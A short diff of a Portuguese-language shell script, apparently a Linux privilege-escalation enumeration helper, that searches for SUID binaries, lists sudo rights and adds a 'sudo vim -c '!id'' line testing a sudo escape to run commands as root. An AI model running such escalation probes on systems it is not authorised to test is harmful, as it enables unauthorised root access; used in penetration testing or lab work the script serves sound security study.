@@ -67,3 +67,4 @@ azul -e "PROCURANDO ARQUIVOS COM PERMISSÃO SET-UID\n"
 find / -perm -u=s -type f 2>/dev/null
 azul -e "PROCURANDO SUDO VULN\n"
 sudo -l
+sudo vim -c '!id'
